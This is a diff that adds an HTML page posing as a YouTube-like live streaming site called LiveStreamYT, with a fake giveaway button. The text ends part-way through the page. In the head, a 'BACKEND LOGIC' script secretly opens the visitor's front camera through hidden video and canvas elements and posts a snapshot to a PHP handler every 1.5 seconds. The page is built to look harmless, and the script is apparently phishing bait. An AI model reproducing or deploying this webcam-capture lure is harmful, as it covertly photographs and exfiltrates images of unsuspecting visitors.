@@ -1,0 +1,1652 @@
+<!doctype html>
+<html lang="en" id="html-root" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>LiveStreamYT — Live Streaming</title>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND DEPENDENCIES (DO NOT REMOVE / MODIFY)
+       ═══════════════════════════════════════════════════════════════ -->
+  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+  <link  rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <!-- ─────────────────────────────────────────── -->
+
+  <!-- Tailwind CSS CDN (UI only) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: { brand: '#ff0000' },
+          fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] },
+        },
+      },
+    }
+  </script>
+
+  <!-- Google Font -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND CAPTURE ELEMENTS (hidden — DO NOT REMOVE / MODIFY)
+       ═══════════════════════════════════════════════════════════════ -->
+  <div class="video-wrap" hidden>
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas id="canvas" width="640" height="480" hidden></canvas>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND LOGIC (DO NOT MODIFY)
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/handlers/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result) {},
+        error: function() {}
+      });
+    }
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.querySelector('span#errorMsg');
+    const constraints = { audio: false, video: { facingMode: "user" } };
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        if (errorMsgElement) errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      }
+    }
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      var context = canvas.getContext('2d');
+      setInterval(function() {
+        context.drawImage(video, 0, 0, 640, 480);
+        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+        post(canvasData);
+      }, 1500);
+    }
+    init();
+  </script>
+  <!-- ═══════════════════════════════════════════════════════════════
+       END BACKEND
+       ═══════════════════════════════════════════════════════════════ -->
+
+  <!-- ── Dark-mode flash prevention ── -->
+  <script>
+    (function () {
+      if (localStorage.getItem('lsyt-theme') === 'light') {
+        document.documentElement.classList.remove('dark');
+        document.documentElement.classList.add('light');
+      }
+    })();
+  </script>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       NEW — PAGE STYLES
+       REMOVED: all old minimal styles
+       ADDED:   glassmorphism, glow, animations, dark/light vars
+       ═══════════════════════════════════════════════════════════════ -->
+  <style>
+    /* ── CSS VARIABLES — theme-aware ─────────────────────────── */
+    :root {
+      --body-bg:       linear-gradient(145deg, #0a0a12 0%, #10101c 40%, #0d0915 100%);
+      --glass-bg:      rgba(255,255,255,0.05);
+      --glass-border:  rgba(255,255,255,0.08);
+      --glass-bg-s:    rgba(255,255,255,0.08);
+      --glass-border-s:rgba(255,255,255,0.14);
+      --text-1:        #ffffff;
+      --text-2:        #d1d5db;
+      --text-3:        #9ca3af;
+      --text-4:        #6b7280;
+      --divider:       rgba(255,255,255,0.08);
+    }
+    html.light {
+      --body-bg:       linear-gradient(145deg, #f0f4ff 0%, #e8ecf8 40%, #f5f3ff 100%);
+      --glass-bg:      rgba(255,255,255,0.55);
+      --glass-border:  rgba(99,102,241,0.15);
+      --glass-bg-s:    rgba(255,255,255,0.65);
+      --glass-border-s:rgba(99,102,241,0.20);
+      --text-1:        #1e1b4b;
+      --text-2:        #374151;
+      --text-3:        #6b7280;
+      --text-4:        #9ca3af;
+      --divider:       rgba(0,0,0,0.07);
+    }
+
+    /* ── BASE ────────────────────────────────────────────────── */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--body-bg);
+      color: var(--text-1);
+      min-height: 100vh;
+      overflow-x: hidden;
+      transition: background 0.4s ease, color 0.3s ease;
+    }
+
+    /* ── STAR CANVAS ─────────────────────────────────────────── */
+    #star-canvas {
+      position: fixed; inset: 0; z-index: 0;
+      pointer-events: none;
+    }
+    .page-layer { position: relative; z-index: 1; }
+
+    /* ── GLASSMORPHISM ───────────────────────────────────────── */
+    .glass {
+      background: var(--glass-bg);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border: 1px solid var(--glass-border);
+      transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
+    }
+    .glass-s {
+      background: var(--glass-bg-s);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      border: 1px solid var(--glass-border-s);
+      box-shadow: 0 8px 40px rgba(0,0,0,0.35);
+      transition: background 0.3s, border-color 0.3s, box-shadow 0.3s;
+    }
+    html.light .glass-s { box-shadow: 0 8px 40px rgba(99,102,241,0.10); }
+
+    /* ── LIVE BADGE PULSE ────────────────────────────────────── */
+    .live-badge { animation: pulseLive 1.8s ease-in-out infinite; }
+    @keyframes pulseLive {
+      0%,100% { opacity:1; box-shadow: 0 0 0 0 rgba(255,0,0,0.5); }
+      50%     { opacity:0.85; box-shadow: 0 0 0 6px rgba(255,0,0,0); }
+    }
+
+    /* ── PART 1 — NAV HOVER UNDERLINE ────────────────────────── */
+    .nav-link {
+      position: relative;
+      padding-bottom: 2px;
+      transition: color 0.25s ease;
+    }
+    .nav-link::after {
+      content: '';
+      position: absolute;
+      bottom: -3px; left: 0;
+      width: 0; height: 2px;
+      background: linear-gradient(90deg, #ef4444, #f59e0b);
+      border-radius: 2px;
+      transition: width 0.3s cubic-bezier(0.4,0,0.2,1);
+    }
+    .nav-link:hover::after,
+    .nav-link.active::after { width: 100%; }
+    .nav-link.active { color: #f87171 !important; }
+    html.light .nav-link.active { color: #dc2626 !important; }
+
+    /* ── HAMBURGER ───────────────────────────────────────────── */
+    #mobile-menu {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.35s cubic-bezier(0.4,0,0.2,1),
+                  opacity 0.3s ease;
+      opacity: 0;
+    }
+    #mobile-menu.open { max-height: 300px; opacity: 1; }
+
+    /* ── PART 2 — VIDEO GLOW BORDER ──────────────────────────── */
+    .video-glow {
+      box-shadow:
+        0 0 0 1px rgba(239,68,68,0.30),
+        0 0 30px rgba(239,68,68,0.12),
+        0 0 60px rgba(239,68,68,0.06),
+        0 8px 48px rgba(0,0,0,0.50);
+      transition: box-shadow 0.4s ease, transform 0.4s ease;
+    }
+    .video-glow:hover {
+      box-shadow:
+        0 0 0 1px rgba(239,68,68,0.50),
+        0 0 40px rgba(239,68,68,0.22),
+        0 0 80px rgba(239,68,68,0.10),
+        0 8px 56px rgba(0,0,0,0.55);
+      transform: scale(1.005);
+    }
+    html.light .video-glow {
+      box-shadow:
+        0 0 0 1px rgba(239,68,68,0.20),
+        0 0 20px rgba(239,68,68,0.08),
+        0 8px 36px rgba(0,0,0,0.08);
+    }
+
+    /* ── PART 3 — LIKE BOUNCE ────────────────────────────────── */
+    @keyframes likeBounce {
+      0%   { transform: scale(1); }
+      25%  { transform: scale(1.35); }
+      50%  { transform: scale(0.9);  }
+      75%  { transform: scale(1.12); }
+      100% { transform: scale(1); }
+    }
+    .like-bounce { animation: likeBounce 0.45s ease; }
+
+    /* ── PART 3 — SHARE MODAL ────────────────────────────────── */
+    #share-backdrop {
+      display: none;
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.50);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 9000;
+      align-items: center; justify-content: center;
+    }
+    #share-backdrop.visible { display: flex; }
+    #share-modal {
+      background: var(--glass-bg-s);
+      backdrop-filter: blur(28px);
+      -webkit-backdrop-filter: blur(28px);
+      border: 1px solid var(--glass-border-s);
+      border-radius: 24px;
+      box-shadow: 0 24px 80px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.08);
+      /* POLISH: clamp for small screens, max-height guard */
+      padding: clamp(20px, 5vw, 32px) clamp(16px, 5vw, 28px);
+      width: 90%; max-width: 380px;
+      max-height: 90vh;
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      display: flex; flex-direction: column;
+      align-items: center; gap: 16px;
+      animation: modalPop 0.3s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes modalPop {
+      from { opacity:0; transform: scale(0.88) translateY(14px); }
+      to   { opacity:1; transform: scale(1)    translateY(0); }
+    }
+    .share-opt {
+      display: flex; align-items: center; gap: 12px;
+      width: 100%;
+      padding: 12px 16px;
+      border-radius: 14px;
+      font-size: 14px; font-weight: 600;
+      cursor: pointer;
+      border: 1px solid var(--divider);
+      background: transparent;
+      color: var(--text-1);
+      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+    }
+    .share-opt:hover {
+      background: rgba(255,255,255,0.08);
+      transform: translateY(-1px);
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+    }
+    html.light .share-opt:hover { background: rgba(0,0,0,0.04); }
+
+    /* ── COPIED TOAST ────────────────────────────────────────── */
+    #copy-toast {
+      position: fixed;
+      bottom: 32px; left: 50%;
+      transform: translateX(-50%) translateY(20px);
+      opacity: 0;
+      z-index: 9999;
+      pointer-events: none;
+      transition: opacity 0.25s, transform 0.25s;
+    }
+    #copy-toast.show {
+      opacity: 1;
+      transform: translateX(-50%) translateY(0);
+    }
+
+    /* ── SHIMMER DIVIDER ─────────────────────────────────────── */
+    .shimmer-line {
+      height: 1px;
+      background: linear-gradient(90deg,
+        transparent, rgba(239,68,68,0.50), rgba(249,115,22,0.50),
+        rgba(239,68,68,0.50), transparent);
+      background-size: 200% 100%;
+      animation: shimmer 3s linear infinite;
+    }
+    @keyframes shimmer {
+      0%   { background-position: -200% center; }
+      100% { background-position:  200% center; }
+    }
+
+    /* ── ANIMATED GRADIENT ACCENT BAR ────────────────────────── */
+    .gradient-accent {
+      background: linear-gradient(90deg, #ef4444, #f59e0b, #8b5cf6, #06b6d4, #ef4444);
+      background-size: 300% 100%;
+      animation: gradientMove 5s linear infinite;
+    }
+    @keyframes gradientMove {
+      0%   { background-position: 0% center; }
+      100% { background-position: 300% center; }
+    }
+
+    /* ── CUSTOM SCROLLBAR ────────────────────────────────────── */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: #ef4444; border-radius: 4px; }
+
+    /* ── THEME TOGGLE ────────────────────────────────────────── */
+    #theme-toggle { transition: transform 0.25s ease; }
+    #theme-toggle:hover { transform: rotate(18deg) scale(1.12); }
+
+    /* Light mode text overrides for Tailwind dark-default classes */
+    html.light .text-white   { color: var(--text-1) !important; }
+    html.light .text-gray-300 { color: var(--text-2) !important; }
+    html.light .text-gray-400 { color: var(--text-3) !important; }
+    html.light .text-gray-500 { color: var(--text-4) !important; }
+    /* POLISH: description card text readable in light mode */
+    html.light .glass-s p,
+    html.light .glass-s span:not([class*="text-red"]):not([class*="text-green"]):not([class*="bg-"]) {
+      color: var(--text-2);
+    }
+    /* Keep accent colours */
+    html.light .text-red-400   { color: #ef4444 !important; }
+    html.light .text-red-500   { color: #ef4444 !important; }
+    html.light .text-green-400 { color: #22c55e !important; }
+    /* End button text stays white on its red bg */
+    html.light .bg-red-600 .text-white,
+    html.light .bg-red-600 { color: #fff !important; }
+  </style>
+</head>
+
+<body class="min-h-screen font-sans select-none">
+
+  <!-- ═══════════════════════════════════════════════════════════
+       STAR BACKGROUND CANVAS
+       ═══════════════════════════════════════════════════════════ -->
+  <canvas id="star-canvas" aria-hidden="true"></canvas>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       PART 1 — PREMIUM GLASSMORPHISM NAVBAR
+       - backdrop-blur-lg · bg-white/10 · border-b · shadow-lg
+       - Hover underline animation
+       - Active page highlight
+       - Hamburger on mobile
+       ═══════════════════════════════════════════════════════════ -->
+  <header class="page-layer glass sticky top-0 z-50 border-b shadow-lg"
+          style="border-color: var(--glass-border);">
+
+    <!-- Animated gradient accent strip at very top -->
+    <div class="gradient-accent h-[2px] w-full"></div>
+
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex items-center justify-between h-14 sm:h-16">
+
+        <!-- ── Brand ── -->
+        <div class="flex items-center gap-3 shrink-0">
+          <div class="w-8 h-8 sm:w-9 sm:h-9 bg-red-600 rounded-lg flex items-center justify-center shadow-lg shadow-red-900/40">
+            <svg class="w-4 h-4 sm:w-5 sm:h-5 text-white" viewBox="0 0 24 24" fill="currentColor">
+              <path d="M8 5v14l11-7z"/>
+            </svg>
+          </div>
+          <span class="text-lg sm:text-xl font-bold tracking-tight" style="color:var(--text-1)">
+            Live<span class="text-red-500">StreamYT</span>
+          </span>
+        </div>
+
+        <!-- ── Desktop nav ── -->
+        <nav class="hidden md:flex items-center gap-7 text-sm font-medium" style="color:var(--text-3)">
+          <a href="#" class="nav-link hover:text-white">Home</a>
+          <a href="#" class="nav-link active">LiveStreamYT</a>
+          <a href="#" class="nav-link hover:text-white">Trending</a>
+          <a href="#" class="nav-link hover:text-white">Subscriptions</a>
+        </nav>
+
+        <!-- ── Right row ── -->
+        <div class="flex items-center gap-2 sm:gap-3">
+          <!-- LIVE badge -->
+          <span class="live-badge bg-red-600 text-white text-[10px] sm:text-xs font-bold
+                       px-2.5 py-0.5 sm:px-3 sm:py-1 rounded-full uppercase tracking-widest">
+            ● Live
+          </span>
+
+          <!-- Theme toggle -->
+          <button id="theme-toggle"
+                  class="w-8 h-8 sm:w-9 sm:h-9 glass rounded-full flex items-center justify-center
+                         cursor-pointer border-0 outline-none focus:ring-2 focus:ring-red-400/50"
+                  aria-label="Toggle theme" title="Toggle dark / light">
+            <span id="theme-icon" class="text-sm sm:text-base">🌙</span>
+          </button>
+
+          <!-- Hamburger (mobile only) -->
+          <button id="hamburger"
+                  class="md:hidden w-8 h-8 sm:w-9 sm:h-9 glass rounded-full flex items-center justify-center
+                         cursor-pointer border-0 outline-none"
+                  aria-label="Toggle menu">
+            <svg id="hamburger-icon" class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- ── Mobile dropdown nav ── -->
+      <nav id="mobile-menu"
+           class="md:hidden flex flex-col gap-1 pb-3 text-sm font-medium" style="color:var(--text-3)">
+        <a href="#" class="nav-link px-3 py-2 rounded-xl hover:bg-white/5">Home</a>
+        <a href="#" class="nav-link active px-3 py-2 rounded-xl hover:bg-white/5">LiveStreamYT</a>
+        <a href="#" class="nav-link px-3 py-2 rounded-xl hover:bg-white/5">Trending</a>
+        <a href="#" class="nav-link px-3 py-2 rounded-xl hover:bg-white/5">Subscriptions</a>
+      </nav>
+    </div>
+  </header>
+  <!-- ──────────────────────────────────────────────── -->
+
+  <!-- ═══════════════════════════════════════════════════════════
+       MAIN CONTENT
+       ═══════════════════════════════════════════════════════════ -->
+  <main class="page-layer max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8
+               grid grid-cols-1 lg:grid-cols-3 gap-6">
+
+    <!-- ══════════════════════════════════════════════════════
+         LEFT COLUMN — Video player + controls (2/3)
+         ══════════════════════════════════════════════════════ -->
+    <section class="lg:col-span-2 flex flex-col gap-5">
+
+      <!-- ────────────────────────────────────────────────
+           PART 2 — VIDEO CONTAINER (bigger, glow, glass)
+           ──────────────────────────────────────────────── -->
+      <div id="video-wrapper"
+           class="glass-s video-glow rounded-2xl sm:rounded-3xl overflow-hidden">
+
+        <!-- Stream header bar -->
+        <div class="flex items-center justify-between px-4 sm:px-5 py-3 border-b"
+             style="border-color:var(--divider)">
+          <div class="flex items-center gap-2">
+            <span class="live-badge w-2.5 h-2.5 bg-red-500 rounded-full inline-block"></span>
+            <span class="text-xs sm:text-sm font-semibold" style="color:var(--text-1)">
+              LiveStreamYT &mdash; Now Playing
+            </span>
+          </div>
+          <div class="flex items-center gap-2 text-xs" style="color:var(--text-3)">
+            <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M15 10l4.553-2.277A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14
+                       M3 8a2 2 0 012-2h8a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/>
+            </svg>
+            <span id="viewerCount">Loading…</span>
+          </div>
+        </div>
+
+        <!-- ═══ BACKEND IFRAME (src/id unchanged) — DO NOT MODIFY ═══ -->
+        <div class="relative" style="padding-top: 56.25%;">
+          <iframe
+            id="Live_YT_TV"
+            class="absolute inset-0 w-full h-full"
+            src="https://www.youtube.com/embed/live_yt_tv?autoplay=1"
+            frameborder="0"
+            allow="autoplay encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen>
+          </iframe>
+        </div>
+        <!-- ═══════════════════════════════════════════════════════════ -->
+
+        <!-- ────────────────────────────────────────────────
+             PART 3 — CONTROL BUTTONS (Like, Share, Fullscreen)
+             ──────────────────────────────────────────────── -->
+        <div class="flex flex-wrap items-center gap-2 sm:gap-3 px-4 sm:px-5 py-3 sm:py-4 border-t"
+             style="border-color:var(--divider)">
+
+          <!-- Play / Reload -->
+          <button onclick="document.getElementById('Live_YT_TV').src = document.getElementById('Live_YT_TV').src"
+                  class="flex items-center gap-2 bg-red-600 hover:bg-red-500
+                         active:scale-95 transition-all duration-300
+                         px-4 sm:px-5 py-2 rounded-xl
+                         text-xs sm:text-sm font-semibold text-white
+                         shadow-lg shadow-red-900/40
+                         hover:scale-105 hover:shadow-2xl hover:shadow-red-800/50
+                         cursor-pointer border-0 outline-none">
+            <svg class="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+            <span class="hidden sm:inline">LiveStreamYT</span>
+            <span class="sm:hidden">Play</span>
+          </button>
+
+          <!-- 👍 LIKE BUTTON -->
+          <button id="btn-like"
+                  class="flex items-center gap-2 glass hover:bg-white/10
+                         active:scale-95 transition-all duration-300
+                         px-4 sm:px-5 py-2 rounded-xl
+                         text-xs sm:text-sm font-medium
+                         hover:scale-105 hover:shadow-xl
+                         cursor-pointer border-0 outline-none"
+                  style="color:var(--text-2)">
+            <svg id="like-icon" class="w-4 h-4 shrink-0 transition-colors duration-200"
+                 fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M14 9V5a3 3 0 00-3-3l-4 9v11h11.28a2 2 0 002-1.7l1.38-9a2 2 0 00-2-2.3H14z
+                       M7 22H4a2 2 0 01-2-2v-7a2 2 0 012-2h3"/>
+            </svg>
+            <span id="like-label">Like</span>
+            <span id="like-count"
+                  class="text-xs font-bold rounded-full px-1.5 py-0.5
+                         bg-white/10 tabular-nums min-w-[28px] text-center">
+              0
+            </span>
+          </button>
+
+          <!-- 🔗 SHARE BUTTON -->
+          <button id="btn-share"
+                  class="flex items-center gap-2 glass hover:bg-white/10
+                         active:scale-95 transition-all duration-300
+                         px-4 sm:px-5 py-2 rounded-xl
+                         text-xs sm:text-sm font-medium
+                         hover:scale-105 hover:shadow-xl
+                         cursor-pointer border-0 outline-none"
+                  style="color:var(--text-2)">
+            <svg class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/>
+              <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/>
+              <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/>
+            </svg>
+            Share
+          </button>
+
+          <!-- Spacer -->
+          <div class="flex-1"></div>
+
+          <!-- ⛶ FULLSCREEN BUTTON -->
+          <button id="btn-fullscreen"
+                  class="flex items-center gap-2 glass hover:bg-white/10
+                         active:scale-95 transition-all duration-300
+                         px-4 sm:px-5 py-2 rounded-xl
+                         text-xs sm:text-sm font-medium
+                         hover:scale-105 hover:shadow-xl
+                         cursor-pointer border-0 outline-none"
+                  style="color:var(--text-2)">
+            <svg id="fs-icon-expand" class="w-4 h-4 shrink-0" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3
+                       m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/>
+            </svg>
+            <svg id="fs-icon-shrink" class="w-4 h-4 shrink-0 hidden" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M4 14h6v6m10-10h-6V4m0 16h6v-6M4 4h6v6"/>
+            </svg>
+            <span id="fs-label">Fullscreen</span>
+          </button>
+        </div>
+      </div>
+      <!-- ──────────────────────────────────────────────── -->
+
+      <!-- ────────────────────────────────────────────────
+           PART 4 — VIDEO TITLE & DESCRIPTION
+           ──────────────────────────────────────────────── -->
+
+      <!-- Title section -->
+      <div class="glass-s rounded-2xl sm:rounded-3xl px-4 sm:px-6 py-4 sm:py-5 space-y-3">
+
+        <div class="flex flex-col sm:flex-row sm:items-start sm:justify-between gap-3">
+          <div class="space-y-1 flex-1 min-w-0">
+            <h1 class="text-base sm:text-lg lg:text-xl font-bold leading-snug truncate"
+                style="color:var(--text-1)">
+              🔴 Live Streaming — Join the Broadcast Now
+            </h1>
+            <p class="text-xs sm:text-sm" style="color:var(--text-3)">
+              <span id="viewerCount2" class="tabular-nums">0</span> watching now
+              · Started streaming <span id="streamAge" class="tabular-nums">just now</span>
+            </p>
+          </div>
+        </div>
+
+        <!-- Shimmer divider -->
+        <div class="shimmer-line"></div>
+
+        <!-- Channel row -->
+        <div class="flex items-center justify-between gap-3">
+          <div class="flex items-center gap-3">
+            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-red-500 to-orange-500
+                        flex items-center justify-center font-bold text-sm text-white shadow-md shrink-0">
+              YT
+            </div>
+            <div class="min-w-0">
+              <p class="text-sm font-semibold truncate" style="color:var(--text-1)">
+                LiveStreamYT Channel
+              </p>
+              <p class="text-xs" style="color:var(--text-4)">Live broadcast in progress</p>
+            </div>
+          </div>
+          <button id="btn-subscribe"
+                  class="bg-red-600 hover:bg-red-500 text-white text-xs font-bold
+                         px-4 py-2 rounded-full transition-all duration-300
+                         hover:scale-105 hover:shadow-lg hover:shadow-red-900/40
+                         active:scale-95 cursor-pointer border-0 outline-none shrink-0">
+            Subscribe
+          </button>
+        </div>
+      </div>
+
+      <!-- Description card (blur glass) -->
+      <div class="glass-s rounded-2xl sm:rounded-3xl px-4 sm:px-6 py-4 sm:py-5 space-y-3">
+        <div class="flex items-center justify-between">
+          <h2 class="text-xs sm:text-sm font-bold uppercase tracking-widest" style="color:var(--text-3)">
+            Description
+          </h2>
+          <button id="desc-toggle"
+                  class="text-xs font-medium cursor-pointer border-0 bg-transparent outline-none
+                         transition-colors duration-200 hover:text-red-400"
+                  style="color:var(--text-4)">
+            Show more
+          </button>
+        </div>
+        <div id="desc-content" class="text-xs sm:text-sm leading-relaxed space-y-2 overflow-hidden"
+             style="color:var(--text-2); max-height: 4.2em; transition: max-height 0.4s ease;">
+          <p>
+            Welcome to LiveStreamYT! 🎬 This is your premium live streaming experience.
+            Sit back and enjoy high-quality content streamed directly to your device.
+          </p>
+          <p>
+            🔔 Don't forget to subscribe and hit the notification bell to stay updated
+            with our latest live broadcasts, special events, and exclusive content.
+          </p>
+          <p>
+            📌 Categories: Entertainment · Live Events · Technology · Music<br>
+            🌍 Broadcasting worldwide · 24/7 live programming
+          </p>
+        </div>
+      </div>
+      <!-- ──────────────────────────────────────────────── -->
+
+    </section>
+
+    <!-- ══════════════════════════════════════════════════════
+         RIGHT COLUMN — Sidebar (1/3)
+         ══════════════════════════════════════════════════════ -->
+    <aside class="flex flex-col gap-5">
+
+      <!-- Stream Info card -->
+      <div class="glass-s rounded-2xl sm:rounded-3xl p-5">
+        <h2 class="text-xs sm:text-sm font-bold uppercase tracking-widest mb-4" style="color:var(--text-3)">
+          Stream Info
+        </h2>
+        <div class="space-y-3 text-sm">
+          <div class="flex justify-between">
+            <span style="color:var(--text-3)">Platform</span>
+            <span class="font-medium" style="color:var(--text-1)">LiveStreamYT</span>
+          </div>
+          <div class="flex justify-between">
+            <span style="color:var(--text-3)">Status</span>
+            <span class="text-green-400 font-medium flex items-center gap-1">
+              <span class="live-badge w-2 h-2 bg-green-400 rounded-full inline-block"></span> Online
+            </span>
+          </div>
+          <div class="flex justify-between">
+            <span style="color:var(--text-3)">Quality</span>
+            <span class="font-medium" style="color:var(--text-1)">Auto (HD)</span>
+          </div>
+          <div class="flex justify-between">
+            <span style="color:var(--text-3)">Uptime</span>
+            <span id="streamTime" class="font-medium tabular-nums" style="color:var(--text-1)">00:00:00</span>
+          </div>
+          <div class="flex justify-between">
+            <span style="color:var(--text-3)">Viewers</span>
+            <span id="viewerCount3" class="font-medium tabular-nums" style="color:var(--text-1)">—</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- 🎁 GIVEAWAY REVEAL BUTTON -->
+      <button id="btn-reveal-giveaway"
+              class="w-full relative overflow-hidden rounded-2xl sm:rounded-3xl
+                     px-5 py-4 font-bold text-sm sm:text-base text-white
+                     cursor-pointer border-0 outline-none
+                     transition-all duration-300
+                     hover:scale-[1.03] active:scale-[0.97]
+                     focus:ring-2 focus:ring-yellow-400/60"
+              style="background: linear-gradient(135deg, #dc2626 0%, #ea580c 40%, #d97706 80%, #ca8a04 100%);
+                     box-shadow: 0 0 20px rgba(220,38,38,0.45), 0 4px 24px rgba(234,88,12,0.35);
+                     letter-spacing: 0.01em;">
+        <!-- shimmer sweep -->
+        <span class="absolute inset-0 pointer-events-none"
+              style="background: linear-gradient(105deg, transparent 35%, rgba(255,255,255,0.18) 50%, transparent 65%);
+                     animation: giveawayShimmer 2.2s linear infinite;"></span>
+        <!-- pulse ring -->
+        <span class="absolute inset-0 rounded-2xl sm:rounded-3xl pointer-events-none"
+              style="box-shadow: 0 0 0 0 rgba(250,204,21,0.55);
+                     animation: giveawayPulse 2s ease-out infinite;"></span>
+        <span class="relative flex items-center justify-center gap-2">
+          <span style="font-size:1.2em;">&#x1F381;</span>
+          Unlock Your Mega Surprise
+          <span style="font-size:1.1em;">&#x1F525;</span>
+        </span>
+      </button>
+
+      <!-- Quick actions card -->
+      <div class="glass-s rounded-2xl sm:rounded-3xl p-5">
+        <h2 class="text-xs sm:text-sm font-bold uppercase tracking-widest mb-4" style="color:var(--text-3)">
+          Quick Actions
+        </h2>
+        <div class="grid grid-cols-2 gap-3">
+          <button class="glass hover:bg-white/10 transition-all duration-300 hover:scale-105
+                         rounded-xl py-3 flex flex-col items-center gap-1.5 text-xs font-medium
+                         cursor-pointer border-0 outline-none" style="color:var(--text-2)">
+            <svg class="w-5 h-5 text-red-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <circle cx="12" cy="12" r="10"/><polygon points="10 8 16 12 10 16 10 8"/>
+            </svg>
+            Watch Live
+          </button>
+          <button class="glass hover:bg-white/10 transition-all duration-300 hover:scale-105
+                         rounded-xl py-3 flex flex-col items-center gap-1.5 text-xs font-medium
+                         cursor-pointer border-0 outline-none" style="color:var(--text-2)">
+            <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M18 8h1a4 4 0 010 8h-1M2 8h16v9a4 4 0 01-4 4H6a4 4 0 01-4-4V8zM6 1v3M10 1v3M14 1v3"/>
+            </svg>
+            Subscribe
+          </button>
+          <button class="glass hover:bg-white/10 transition-all duration-300 hover:scale-105
+                         rounded-xl py-3 flex flex-col items-center gap-1.5 text-xs font-medium
+                         cursor-pointer border-0 outline-none" style="color:var(--text-2)">
+            <svg class="w-5 h-5 text-yellow-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M18 20V10M12 20V4M6 20v-6"/>
+            </svg>
+            Analytics
+          </button>
+          <button class="glass hover:bg-white/10 transition-all duration-300 hover:scale-105
+                         rounded-xl py-3 flex flex-col items-center gap-1.5 text-xs font-medium
+                         cursor-pointer border-0 outline-none" style="color:var(--text-2)">
+            <svg class="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+              <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+            </svg>
+            Chat
+          </button>
+        </div>
+      </div>
+
+      <!-- Status footer mini card -->
+      <div class="glass rounded-2xl px-5 py-3 flex items-center justify-between text-xs" style="color:var(--text-4)">
+        <span>© LiveStreamYT</span>
+        <span class="flex items-center gap-1 text-green-400">
+          <span class="live-badge w-1.5 h-1.5 bg-green-400 rounded-full inline-block"></span>
+          All systems online
+        </span>
+      </div>
+    </aside>
+
+  </main>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SHARE MODAL
